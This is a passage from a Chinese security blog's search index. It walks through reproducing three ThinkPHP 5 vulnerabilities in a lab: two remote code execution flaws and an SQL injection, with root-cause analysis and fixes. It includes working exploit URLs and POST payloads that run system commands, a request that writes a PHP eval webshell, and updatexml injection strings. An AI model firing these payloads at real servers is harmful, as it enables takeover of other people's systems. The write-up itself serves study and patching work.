<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>ThinkPHP典型漏洞复现</title>
    <link href="/2025/03/27/ThinkPHP%E5%85%B8%E5%9E%8B%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2025/03/27/ThinkPHP%E5%85%B8%E5%9E%8B%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="ThinkPHP框架"><a href="#ThinkPHP框架" class="headerlink" title="ThinkPHP框架"></a>ThinkPHP框架</h1><p>般有thinkphp2、thinkphp3、thinkphp5、thinkphp6版本，前两个版本已经停止更新，一般也没有人再继续用，所以就不再做复现了，本篇文章主要介绍下thinkphp5、6的漏洞</p><h2 id="一、Thinkphp5-5-0-22-5-1-29-远程代码执行漏洞"><a href="#一、Thinkphp5-5-0-22-5-1-29-远程代码执行漏洞" class="headerlink" title="一、Thinkphp5 5.0.22&#x2F;5.1.29 远程代码执行漏洞"></a>一、Thinkphp5 5.0.22&#x2F;5.1.29 远程代码执行漏洞</h2><h3 id="影响版本：5-0"><a href="#影响版本：5-0" class="headerlink" title="影响版本：5.0&lt;thinkphp&lt;&#x3D;5.0.22、5.1&lt;thinkphp&lt;&#x3D;5.1.29"></a><strong>影响版本</strong>：5.0&lt;thinkphp&lt;&#x3D;5.0.22、5.1&lt;thinkphp&lt;&#x3D;5.1.29</h3><h3 id="漏洞成因："><a href="#漏洞成因：" class="headerlink" title="漏洞成因："></a>漏洞成因：</h3><p>由于<strong>没有正确处理控制器名</strong>，导致在网站没有开启强制路由的情况下（即默认情况下）可以执行任意方法，从而导致远程命令执行漏洞 </p><ol><li><strong><code>Route::parseUrl()</code> 没有正确处理 <code>\</code> 符号</strong>，导致 <code>think\app</code> 被错误解析为控制器名。（因为 <code>parseUrl()</code> 只按照 <code>/</code> 进行分割，而 <code>\</code>不会被处理）</li><li><strong><code>invokefunction()</code> 方法本身支持执行任意 PHP 函数</strong>，成为了攻击者利用的入口。</li><li>**ThinkPHP 允许通过 URL 直接访问 <code>invokefunction()</code>**，没有额外的权限验证。</li></ol><h3 id="详细解释："><a href="#详细解释：" class="headerlink" title="详细解释："></a>详细解释：</h3><p>这个漏洞的核心原因是 <strong><code>routeCheck</code> 方法</strong> 在处理 URL 路由时，没有正确区分 <code>/</code>（正斜杠）和 <code>\</code>（反斜杠）。攻击者可以利用这个问题，<strong>绕过正常的路由限制，直接调用系统函数</strong>，从而导致 <strong>远程命令执行（RCE）漏洞</strong>。</p><h3 id="1-漏洞发生的关键代码"><a href="#1-漏洞发生的关键代码" class="headerlink" title="1. 漏洞发生的关键代码"></a>1. 漏洞发生的关键代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 路由无效 解析模块/控制器/操作/参数... 支持控制器自动搜索</span><br><span class="hljs-keyword">if</span> (<span class="hljs-literal">false</span> === <span class="hljs-variable">$result</span>) &#123;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title class_">Route</span>::<span class="hljs-title function_ invoke__">parseUrl</span>(<span class="hljs-variable">$path</span>, <span class="hljs-variable">$depr</span>, <span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;controller_auto_search&#x27;</span>]);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br></code></pre></td></tr></table></figure><ul><li><strong><code>$path</code></strong> 变量是 URL 请求路径（例如 <code>index/think\app/invokefunction</code>）。</li><li><strong><code>Route::parseUrl()</code></strong> 解析 <code>$path</code>，默认 <strong>按 <code>/</code>（正斜杠）分割</strong>，但不会处理 <code>\</code>（反斜杠）。</li><li>由于 <code>think\app/invokefunction</code> <strong>包含反斜杠</strong>，ThinkPHP <strong>错误地解析</strong> 了它，将 <code>think\app</code> 作为控制器，而 <code>invokefunction</code> 作为方法。</li></ul><h3 id="2-URL-解析过程"><a href="#2-URL-解析过程" class="headerlink" title="2. URL 解析过程"></a>2. URL 解析过程</h3><p>假设攻击者访问：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">http://127.0.0.1:8080/index.php?s=index/think\app/invokefunction<br></code></pre></td></tr></table></figure><p>ThinkPHP 执行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$result</span> = <span class="hljs-title class_">Route</span>::<span class="hljs-title function_ invoke__">parseUrl</span>(<span class="hljs-string">&#x27;index/think\app/invokefunction&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>);<br></code></pre></td></tr></table></figure><p>因为 <code>parseUrl()</code> 只按照 <code>/</code> 进行分割，而 <code>\</code> 不会被处理，所以解析后的 <code>$result</code> 是：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$result</span> = [<br>    <span class="hljs-number">0</span> =&gt; <span class="hljs-string">&#x27;index&#x27;</span>,<br>    <span class="hljs-number">1</span> =&gt; <span class="hljs-string">&#x27;think\app&#x27;</span>,  <span class="hljs-comment">// 解析错误！本该是 think.app</span><br>    <span class="hljs-number">2</span> =&gt; <span class="hljs-string">&#x27;invokefunction&#x27;</span><br>];<br></code></pre></td></tr></table></figure><p>本来 ThinkPHP 期望：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">模块名 <span class="hljs-regexp">/ 控制器名 /</span> 方法名<br>index <span class="hljs-regexp">/ think /</span> app<br></code></pre></td></tr></table></figure><p>但因为 <code>\</code> <strong>未被正确处理</strong>，导致：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">模块名 <span class="hljs-regexp">/ 控制器名 /</span> 方法名<br>index <span class="hljs-regexp">/ think\app /</span> invokefunction<br></code></pre></td></tr></table></figure><p><code>think\app</code> 被错误识别为控制器！</p><p>最终 ThinkPHP 进入 <code>app\Run::exec()</code>，代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$reflect</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">\ReflectionMethod</span>(<span class="hljs-variable">$controller</span>, <span class="hljs-variable">$action</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$reflect</span>-&gt;<span class="hljs-title function_ invoke__">invokeArgs</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$class</span>) ? <span class="hljs-variable">$class</span> : <span class="hljs-literal">null</span>, <span class="hljs-variable">$params</span>);<br></code></pre></td></tr></table></figure><p>在这里：</p><ul><li><strong><code>$controller = think\app</code></strong></li><li><strong><code>$action = invokefunction</code></strong></li></ul><p><strong>这个 <code>invokefunction()</code> 方法在 <code>App</code> 类中确实存在</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">invokefunction</span>(<span class="hljs-params"><span class="hljs-variable">$function</span>, <span class="hljs-variable">$vars</span> = []</span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-variable">$function</span>, <span class="hljs-variable">$vars</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>所以 <code>ReflectionMethod::invokeArgs()</code> **成功调用 <code>invokefunction()</code>**，并执行攻击者传入的 PHP 函数。</p><h3 id="3-漏洞利用示例"><a href="#3-漏洞利用示例" class="headerlink" title="3.漏洞利用示例"></a>3.漏洞利用示例</h3><p>在 ThinkPHP 框架中，<strong>控制器（Controller）</strong> 是用于处理 HTTP 请求的类。通常，访问 URL 时，会按照如下规则解析：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>example.com<span class="hljs-regexp">/index.php/m</span>odule<span class="hljs-regexp">/controller/</span>action<br></code></pre></td></tr></table></figure><ul><li><code>module</code>：模块（可以省略）</li><li><code>controller</code>：控制器（类名）</li><li><code>action</code>：方法（函数名）</li></ul><p>ThinkPHP 提供了 强制路由模式，如果启用，所有访问请求必须经过 <code>route.php</code> 里定义的规则，而不能直接访问控制器的方法。</p><p>但默认情况下，ThinkPHP 没有启用强制路由，这导致攻击者可以通过 URL 直接调用 任何类的方法。</p><p>验证漏洞POC（<strong>在 ThinkPHP 5.x</strong> 版本中，<code>s</code> <strong>是默认的 URL 入口参数</strong>，用于解析路由。）</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">8080</span>/index.php?s=<span class="hljs-keyword">index</span>/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[<span class="hljs-number">0</span>]=<span class="hljs-keyword">system</span>&amp;vars[<span class="hljs-number">1</span>][]=whoami<br></code></pre></td></tr></table></figure><p>ThinkPHP 解析 URL 时，会将参数传递给 **<code>invokefunction()</code>**，等效于：（这个函数是ThinkPHP 5.0.20、5.0.23 版本 <code>App</code> 类的方法）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$function</span> = <span class="hljs-string">&#x27;call_user_func_array&#x27;</span>;<br><span class="hljs-variable">$vars</span> = [<span class="hljs-string">&#x27;system&#x27;</span>, [<span class="hljs-string">&#x27;whoami&#x27;</span>]];<br><br><span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-string">&#x27;call_user_func_array&#x27;</span>, [<span class="hljs-string">&#x27;system&#x27;</span>, [<span class="hljs-string">&#x27;whoami&#x27;</span>]]);<br></code></pre></td></tr></table></figure><p> <strong><code>call_user_func_array()</code></strong> 作用是调用指定函数，并传递参数数组：（这个函数是PHP 内置函数）</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">call_user_func_array(&#x27;system&#x27;, [&#x27;whoami&#x27;])<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>等效于：</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean"><span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br></code></pre></td></tr></table></figure><p>或者写入一句话（同样url编码）构造的方法同上</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">8080</span>/index.php?s=<span class="hljs-keyword">index</span>/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[<span class="hljs-number">0</span>]=<span class="hljs-keyword">system</span>&amp;vars[<span class="hljs-number">1</span>[]=echo%2<span class="hljs-number">0</span>%27%<span class="hljs-number">3</span>C%<span class="hljs-number">3</span>Fphp%2<span class="hljs-number">0</span>%40eval%28%24_POST%<span class="hljs-number">5</span>B%22x%22%<span class="hljs-number">5</span>D%29%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>E%27%2<span class="hljs-number">0</span>%3Eshell.php%20<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503201705913.png" alt="img"></p><h3 id="防御措施："><a href="#防御措施：" class="headerlink" title="防御措施："></a>防御措施：</h3><ol><li>升级 ThinkPHP</li><li>启用强制路由（只有访问正确的路由才会生效）</li><li>禁用 PHP 危险函数     禁止 <code>invokefunction()</code> 方法</li><li>使用 WAF 进行 URL 过滤</li></ol><h2 id="二、ThinkPHP5-5-0-23-之前远程代码执行漏洞"><a href="#二、ThinkPHP5-5-0-23-之前远程代码执行漏洞" class="headerlink" title="二、ThinkPHP5  5.0.23 之前远程代码执行漏洞"></a>二、ThinkPHP5  5.0.23 之前远程代码执行漏洞</h2><p>注意：以下的漏洞所对应的ThinkPHP版本是5.0.23之前的不包括5.0.23</p><h3 id="影响版本：-5-0-ThinkPHP"><a href="#影响版本：-5-0-ThinkPHP" class="headerlink" title="影响版本： 5.0&lt; ThinkPHP&lt;5.0.23、 5.1&lt; ThinkPHP&lt;5.1.31"></a>影响版本： 5.0&lt; ThinkPHP&lt;5.0.23、 5.1&lt; ThinkPHP&lt;5.1.31</h3><p>ThinkPHP5 5.0.23远程代码执行漏洞的利用过程涉及三个核心机制：<strong>路由机制缺陷</strong>、<code>method</code><strong>属性覆盖</strong>和<strong>方法调用</strong>。以下是对这三个环节的详细技术解析：</p><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">_method=__construct&amp;filter[]=system&amp;<span class="hljs-keyword">method</span>=<span class="hljs-title function_">get</span>&amp;<span class="hljs-title function_">server</span>[<span class="hljs-title function_">REQUEST_METHOD</span>]=<span class="hljs-title function_">id</span><br></code></pre></td></tr></table></figure><h3 id="Ⅰ、路由机制缺陷：-index-php-s-captcha-的作用"><a href="#Ⅰ、路由机制缺陷：-index-php-s-captcha-的作用" class="headerlink" title="Ⅰ、路由机制缺陷：/index.php?s=captcha 的作用"></a>Ⅰ、路由机制缺陷：<code>/index.php?s=captcha</code> 的作用</h3><ol><li><p><strong>路由解析流程</strong> ThinkPHP框架通过URL参数<code>s</code>确定路由规则。当访问<code>/index.php?s=captcha</code>时，<code>s</code>参数指定了路由到<code>captcha</code>模块（验证码模块）。</p><ul><li>框架会尝试调用<code>Captcha</code>控制器的<code>index</code>方法，这是内置的验证码生成逻辑。</li><li>漏洞利用的关键在于：<code>captcha</code>对应的路由注册为<code>method</code>类型，导致框架进入<code>method</code>分支处理（而非正常的控制器方法调用），绕过了路由安全检查。</li></ul></li><li><p><strong>绕过路由检测</strong> 通过<code>s=captcha</code>，攻击者触发框架的<code>routeCheck</code>方法，但实际分发到<code>method</code>调度类型。这使得攻击链可以绕过正常的控制器参数过滤，直接操作<code>Request</code>类的敏感方法，为后续漏洞利用提供入口 。</p></li></ol><h3 id="Ⅱ、属性覆盖：-method-construct-的利用"><a href="#Ⅱ、属性覆盖：-method-construct-的利用" class="headerlink" title="Ⅱ、属性覆盖：_method=__construct 的利用"></a>Ⅱ、属性覆盖：<code>_method=__construct</code> 的利用</h3><ol><li><p><strong>构造函数覆盖原理</strong> <code>_method=__construct</code>通过表单伪装变量（<code>var_method</code>）触发<code>Request</code>类的构造函数<code>__construct()</code>。该函数允许通过传入的参数覆盖类的属性值：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">PHPpublic <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$options</span> = []</span>) </span>&#123;<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$options</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$name</span> =&gt; <span class="hljs-variable">$item</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">property_exists</span>(<span class="hljs-variable">$this</span>, <span class="hljs-variable">$name</span>)) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$name</span> = <span class="hljs-variable">$item</span>; <span class="hljs-comment">// 覆盖类属性</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>攻击者通过POST参数覆盖<code>filter</code></p><p>属性为<code>system</code></p><p>以及<code>server[REQUEST_METHOD]</code></p><p>为<code>id</code>，从而控制后续执行逻辑。</p></li></ul></li><li><p><strong>关键参数的作用</strong></p><ul><li><p><code>filter[]=system</code>：将<code>Request</code>类的<code>filter</code>属性设置为<code>system</code>函数，后续数据过滤时会调用此函数执行命令</p><p><code>server[REQUEST_METHOD]=id</code>：覆盖服务器变量REQUEST_METHOD的值，作为system</p><p>函数的参数（即执行system(‘id’)</p></li></ul></li></ol><h3 id="Ⅲ、方法调用：method-get-的执行链"><a href="#Ⅲ、方法调用：method-get-的执行链" class="headerlink" title="Ⅲ、方法调用：method=get 的执行链"></a>Ⅲ、方法调用：<code>method=get</code> 的执行链</h3><ol><li><p><strong>方法调用流程</strong> 通过<code>method=get</code>指定请求方法为GET，触发<code>Request::method()</code>方法的分支处理：method&#x3D;get</p><p>使框架进入param()方法，调用input()函数处理请求参数在input()函数中，调用filterValue()方法，使用call_user_func执行filter属性指定的函数（即system）</p></li><li><p><strong>异常触发回显</strong> 当<code>data</code>参数为空时，<code>array_walk_recursive</code>函数处理会抛出异常。框架在异常处理阶段通过<code>ob_get_clean()</code>捕获输出缓冲区，将<code>system(&#39;id&#39;)</code>的执行结果回显到页面，从而实现命令执行结果的可见 。</p></li></ol><h3 id="Ⅳ、漏洞利过程总结"><a href="#Ⅳ、漏洞利过程总结" class="headerlink" title="Ⅳ、漏洞利过程总结"></a>Ⅳ、漏洞利过程总结</h3><ol><li><p><strong>ThinkPHP 解析 <code>_method=__construct</code></strong></p><p>触发 <code>__construct</code> 方法。</p><p><strong><code>filter[]=system</code> 被传递到 <code>array_map()</code></strong><code>$input = array_map($filter, $data);</code></p><p>让 <code>system()</code> 处理输入。</p><p><strong><code>server[REQUEST_METHOD]</code> 伪造 shell 命令</strong></p><p>这导致 <code>system($_SERVER[&#39;REQUEST_METHOD&#39;])</code> 执行 <strong>反向 shell 命令</strong>。</p></li><li><p><strong>修复方案</strong> ThinkPHP官方在后续版本中修复了此漏洞，主要措施包括：</p><p>对var_method参数进行白名单限制（仅允许GET&#x2F;POST&#x2F;PUT&#x2F;DELETE等合法方法）。</p><p>强化filter属性的初始化逻辑，避免外部参数覆盖</p></li></ol><h3 id="Ⅴ、漏洞影响"><a href="#Ⅴ、漏洞影响" class="headerlink" title="Ⅴ、漏洞影响"></a>Ⅴ、漏洞影响</h3><p>此漏洞允许攻击者通过HTTP请求直接执行任意系统命令，典型利用场景包括：</p><ul><li><p>信息泄露：执行id、whoami、ls等命令</p></li><li><p>写入Webshell：通过echo或文件操作函数写入恶意代码</p></li><li><p>反弹Shell：构造命令建立反向连接，获取服务器控制权。</p></li></ul><p>通过上述机制，攻击者可在未授权情况下完全控制目标服务器，属于高危远程代码执行漏洞。</p><p>在ThinkPHP 5.0.23远程代码执行漏洞中，“<strong>绕过路由检测</strong>”是攻击链的关键步骤，其核心逻辑是通过<code>s=captcha</code>触发框架的路由机制缺陷，从而绕过正常的路由安全检查并直接操作<code>Request</code>类的敏感方法。以下是具体技术细节分析：</p><h3 id="Ⅵ、路由机制的正常流程"><a href="#Ⅵ、路由机制的正常流程" class="headerlink" title="Ⅵ、路由机制的正常流程"></a>Ⅵ、路由机制的正常流程</h3><p>ThinkPHP框架的路由机制通常遵循以下流程：</p><ol><li><p>URL解析：根据URL中的s参数确定模块、控制器和方法。例如：&#x2F;index.php?s&#x3D;index&#x2F;controller&#x2F;action</p><p>会调用index模块下的controller控制器的action方法</p></li><li><p>路由分发：框架通过routeCheck()方法验证路由规则，并分发到对应的控制器方法执行</p></li><li><p>参数过滤：在正常流程中，控制器方法的参数会经过过滤（如白名单校验），以防止恶意输入。</p></li></ol><h3 id="Ⅶ、漏洞中的“路由绕过”原理"><a href="#Ⅶ、漏洞中的“路由绕过”原理" class="headerlink" title="Ⅶ、漏洞中的“路由绕过”原理"></a>Ⅶ、漏洞中的“路由绕过”原理</h3><p>攻击者通过构造<code>s=captcha</code>触发漏洞的核心在于<strong>利用路由注册类型的缺陷</strong>，具体步骤如下：</p><h4 id="1-s-captcha的路由注册类型"><a href="#1-s-captcha的路由注册类型" class="headerlink" title="1. s=captcha的路由注册类型"></a>1. <strong><code>s=captcha</code>的路由注册类型</strong></h4><ul><li><p><code>captcha</code>模块的特殊性：captcha是ThinkPHP内置的验证码模块，其路由规则被注册为method类型，即通过HTTP请求方法（GET&#x2F;POST）来分发逻辑method类型路由的分支：当s&#x3D;captcha时，框架进入routeCheck()</p><p>方法后，会根据method参数（如GET&#x2F;POST）选择对应的路由处理逻辑，而非直接调用控制器方法</p></li></ul><h4 id="2-绕过路由检测的触发点"><a href="#2-绕过路由检测的触发点" class="headerlink" title="2. 绕过路由检测的触发点"></a>2. <strong>绕过路由检测的触发点</strong></h4><ul><li><p><code>routeCheck()</code>方法的缺陷：在routeCheck()方法中，若路由规则为method类型，框架会跳过对控制器参数的严格校验，直接进入Request类的method方法处理</p></li><li><p>分发到<code>method</code>调度类型：攻击链通过s&#x3D;captcha将请求分发到method调度分支，从而绕过正常控制器方法的参数过滤逻辑</p></li></ul><h3 id="Ⅷ、操作Request类敏感方法"><a href="#Ⅷ、操作Request类敏感方法" class="headerlink" title="Ⅷ、操作Request类敏感方法"></a>Ⅷ、操作<code>Request</code>类敏感方法</h3><p>绕过路由检测后，攻击者通过以下方式直接操作<code>Request</code>类：</p><ol><li><p><strong>覆盖<code>__construct</code>构造函数</strong>： 通过<code>_method=__construct</code>参数，调用<code>Request</code>类的构造函数，覆盖其属性（如<code>filter</code>和<code>server</code>），从而控制后续过滤逻辑 </p><p>例如：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">HttpPOST /<span class="hljs-keyword">index</span>.php?s=captcha<br>_method=__construct&amp;<span class="hljs-keyword">filter</span>[]=<span class="hljs-keyword">system</span>&amp;<span class="hljs-keyword">server</span>[REQUEST_METHOD]=id<br></code></pre></td></tr></table></figure><ul><li><p><code>filter[]=system</code>：将全局过滤函数设置为<code>system</code>，后续参数处理时会调用此函数执行命令。</p><p>server[REQUEST_METHOD]&#x3D;id：覆盖服务器变量，作为system函数的参数</p></li></ul></li><li><p><strong>触发命令执行</strong>： 通过<code>method=get</code>调用<code>Request::param()</code>方法，最终在<code>filterValue()</code>函数中执行<code>call_user_func(&#39;system&#39;, &#39;id&#39;)</code>，实现远程代码执行</p></li></ol><h3 id="Ⅸ、漏洞影响与修复方案"><a href="#Ⅸ、漏洞影响与修复方案" class="headerlink" title="Ⅸ、漏洞影响与修复方案"></a>Ⅸ、漏洞影响与修复方案</h3><ol><li><p><strong>漏洞影响</strong>： 攻击者通过<code>s=captcha</code>绕过路由检测，直接调用敏感方法，可执行任意系统命令、上传Webshell或反弹Shell </p></li><li><p><strong>修复方案</strong>：</p><ul><li><p>官方补丁：ThinkPHP在5.0.23及以上版本中修复了该漏洞，</p></li><li><p>核心措施包括：对路由参数s进行严格校验（如白名单限制）</p><p>禁止通过_method参数覆盖Request类的敏感属性</p></li><li><p>临时缓解：若无法升级，可手动在App::module方法中增加过滤逻辑，限制filter参数的覆盖</p></li></ul></li></ol><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>通过<code>s=captcha</code>绕过路由检测的本质是<strong>利用框架对method类型路由的校验缺失</strong>，结合<code>Request</code>类的属性覆盖漏洞，形成完整的远程代码执行链。该漏洞的利用过程深刻反映了框架在路由分发和参数过滤机制上的设计缺陷</p><table><thead><tr><th><strong>特征</strong></th><th><strong>5.0.22&#x2F;5.1.29版本</strong></th><th><strong>5.0.23版本</strong></th></tr></thead><tbody><tr><td><strong>漏洞触发点</strong></td><td>路由解析缺陷（直接调用控制器方法）</td><td>Request类属性覆盖（覆盖<code>filter</code>属性）</td></tr><tr><td><strong>利用方式</strong></td><td>通过URL参数直接构造路径</td><td>需通过POST请求覆盖类属性</td></tr><tr><td><strong>参数传递</strong></td><td>直接通过<code>vars[]</code>传递命令参数</td><td>依赖<code>server[REQUEST_METHOD]</code>传递参数</td></tr><tr><td><strong>路由校验限制</strong></td><td>无控制器名过滤</td><td>新增正则校验阻止非法控制器调用</td></tr><tr><td><strong>默认安全配置</strong></td><td>未开启强制路由</td><td>部分路由分支需依赖特定模块（如<code>captcha</code>）</td></tr></tbody></table><h2 id="三、ThinkPHP5-SQL注入漏洞-敏感信息泄露"><a href="#三、ThinkPHP5-SQL注入漏洞-敏感信息泄露" class="headerlink" title="三、ThinkPHP5 SQL注入漏洞 &amp;&amp; 敏感信息泄露"></a>三、ThinkPHP5 SQL注入漏洞 &amp;&amp; 敏感信息泄露</h2><h3 id="1-影响版本：-5-0-13"><a href="#1-影响版本：-5-0-13" class="headerlink" title="1. 影响版本：  5.0.13&lt;&#x3D;ThinkPHP&lt;&#x3D;5.0.15 、 5.1.0&lt;&#x3D;ThinkPHP&lt;&#x3D;5.1.5"></a>1. 影响版本：  5.0.13&lt;&#x3D;ThinkPHP&lt;&#x3D;5.0.15 、 5.1.0&lt;&#x3D;ThinkPHP&lt;&#x3D;5.1.5</h3><h3 id="2-漏洞介绍"><a href="#2-漏洞介绍" class="headerlink" title="2. 漏洞介绍"></a>2. 漏洞介绍</h3><p>ThinkPHP是在中国使用极为广泛的PHP开发框架。在其版本5.0（&lt;5.1.23）中,<strong>开启debug模式</strong>，传入的某参数在绑定编译指令的时候又没有安全处理，预编译的时候导致SQL异常报错。然而thinkphp5默认开启debug模式，在漏洞环境下构造错误的SQL语法会泄漏数据库账户和密码</p><h3 id="3-漏洞利用的前提条件"><a href="#3-漏洞利用的前提条件" class="headerlink" title="3. 漏洞利用的前提条件"></a>3. 漏洞利用的前提条件</h3><p>开启application&#x2F;config.php中的app_debug和app_trace</p><p><code>app_trace</code>（<strong>默认关闭</strong>）作用：开启后，ThinkPHP 会在页面底部显示完整的调试信息（包括 SQL 语句）。</p><p><code>app_debug</code>（<strong>默认开启</strong>）作用：控制是否在前端显示详细错误信息。</p><h3 id="4-漏洞利用过程"><a href="#4-漏洞利用过程" class="headerlink" title="4. 漏洞利用过程"></a>4. 漏洞利用过程</h3><p>docker启靶场然后浏览器访问：<code>http://your-ip/index.php?ids[]=1&amp;ids[]=2</code>[<strong><code>ids</code> 这个参数通常用于查询数据库</strong> <code>id</code> 或 <code>ids</code> 是<strong>常见的查询参数</strong>，通常用于获取数据库中的记录]</p><p><strong>payload1</strong>:<code>http://your-ip/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1</code></p><p><strong>payload2</strong>:<code>http://127.0.0.1/v5.0.15/public/index.php/?username=) union select updatexml(1,concat(0x7,database(),0x7e),1)#</code></p><p><strong>payload1原理</strong>：</p><p><strong>作用</strong>利用 ThinkPHP 处理数组参数的机制，造成 SQL 注入，并利用 <code>updatexml()</code> 读取 MySQL 用户信息。</p><p>分解</p><ol><li><p><code>ids[0,updatexml(0,concat(0xa,user()),0)]=1</code></p><ul><li>这里的 <code>ids</code> 是一个<strong>数组参数</strong>，而 <code>ThinkPHP 5.0.15</code> 解析 <code>$_GET[&#39;ids&#39;]</code> 时，<strong>没有严格校验数组键的合法性</strong>。</li><li><code>updatexml(0,concat(0xa,user()),0)</code> 被当作数组的<strong>键值</strong>，而 <code>1</code> 作为数组的值。</li></ul></li><li><p>服务器端的 SQL 可能类似：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$ids</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ids&#x27;</span>]; <span class="hljs-comment">// 这里是数组</span><br><span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;SELECT * FROM users WHERE id IN (&quot;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-title function_ invoke__">array_keys</span>(<span class="hljs-variable">$ids</span>)) . <span class="hljs-string">&quot;)&quot;</span>;<br></code></pre></td></tr></table></figure><p>由于 <strong><code>implode()</code> 拼接数组键值</strong>，SQL 变成：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id <span class="hljs-keyword">IN</span> (<span class="hljs-number">0</span>, updatexml(<span class="hljs-number">0</span>,concat(<span class="hljs-number">0xa</span>,<span class="hljs-keyword">user</span>()),<span class="hljs-number">0</span>));<br></code></pre></td></tr></table></figure><p><strong>SQL 被注入执行</strong>，并通过 <code>updatexml()</code> 触发错误信息，<strong>返回 MySQL 用户名</strong>。</p></li></ol><p>为什么能成功？</p><ol><li><strong>ThinkPHP 5.0.15 允许数组参数 <code>ids[]</code> 直接拼接到 SQL 语句</strong>：<ul><li>解析 <code>$_GET[&#39;ids&#39;]</code> 时，没有对键值进行严格过滤，导致 